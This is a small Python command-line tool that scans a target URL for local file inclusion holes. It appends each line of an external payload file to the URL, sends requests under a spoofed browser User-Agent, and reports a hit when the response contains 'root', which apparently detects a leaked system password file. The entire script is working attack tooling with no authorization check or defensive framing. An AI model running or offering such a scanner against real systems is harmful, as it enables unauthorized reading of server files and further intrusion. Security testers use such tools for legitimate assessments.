import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help = 'URL with parameter please')
parser = parser.parse_args()

def main():
	file = open('payload_lfi.txt','r')
	file = file.read().split('\n')
	agent = {'User-Agent':'Firefox'}

	if parser.target:
		print(f"(+) Starting the execution: {parser.target}")
		print("-"*50)
		for payload in file:
			query = requests.get(url=parser.target+payload,headers=agent)
			if 'root' in query.text:
				print('-'*50)
				print(f"LFI vulnerability: {parser.target+payload}")
			else:
				pass

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()